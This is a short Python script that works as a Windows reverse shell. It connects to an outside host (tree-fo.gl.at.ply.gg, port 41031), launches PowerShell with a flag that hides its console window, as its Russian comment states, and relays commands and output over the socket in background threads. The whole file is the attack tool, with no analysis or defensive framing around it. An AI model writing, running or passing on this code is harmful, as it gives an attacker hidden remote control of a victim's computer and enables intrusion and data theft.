import os, socket, subprocess, threading

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("tree-fo.gl.at.ply.gg", 41031))

# Добавляем флаг для запуска без окна консоли
CREATE_NO_WINDOW = 0x08000000

p = subprocess.Popen(
    ["powershell"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    stdin=subprocess.PIPE,
    creationflags=CREATE_NO_WINDOW
)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
